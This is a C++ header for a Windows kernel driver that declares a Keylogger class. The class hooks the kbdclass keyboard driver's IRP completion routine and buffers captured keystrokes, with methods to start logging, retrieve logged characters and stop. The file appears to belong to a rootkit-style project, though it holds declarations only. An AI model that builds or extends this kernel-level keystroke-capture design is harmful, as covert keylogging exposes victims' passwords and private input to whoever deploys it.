#pragma once

#include <ntifs.h>

#include "IrpHook.h"
#include "PoolPointer.h"
#include "Mutex.h"

/*
	Keylogging functionality, implemented by kbdclass hook.
*/

//
// NtReadFile Output Buffer record structures for this device.
// Taken from ntddkbd.h
//
typedef struct _KEYBOARD_INPUT_DATA {

    //
    // Unit number.  E.g., for \Device\KeyboardPort0 the unit is '0',
    // for \Device\KeyboardPort1 the unit is '1', and so on.
    //

    USHORT UnitId;

    //
    // The "make" scan code (key depression).
    //

    USHORT MakeCode;

    //
    // The flags field indicates a "break" (key release) and other
    // miscellaneous scan code information defined below.
    //

    USHORT Flags;

    USHORT Reserved;

    //
    // Device-specific additional information for the event.
    //

    ULONG ExtraInformation;

} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;

class Keylogger {
public:
	Keylogger(IrpHookManager& HookManager, ULONG BufferSize = 0x1000);

	VOID StartLogging();

	VOID GetLoggedChars(char* OutputBuffer, ULONG* BufferLength);

	VOID EndKeylogging();
	
private:
	VOID AppendDataToBuffer(PKEYBOARD_INPUT_DATA LoggedStrokes, ULONG Length);

	friend NTSTATUS HookedKbdclassCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
private:
	IrpHookManager hookManager;
	Vector<KEYBOARD_INPUT_DATA> buffer;
	ULONG offsetInBuffer;
	Mutex bufferLock;
	bool keyloggingInProgress;
};
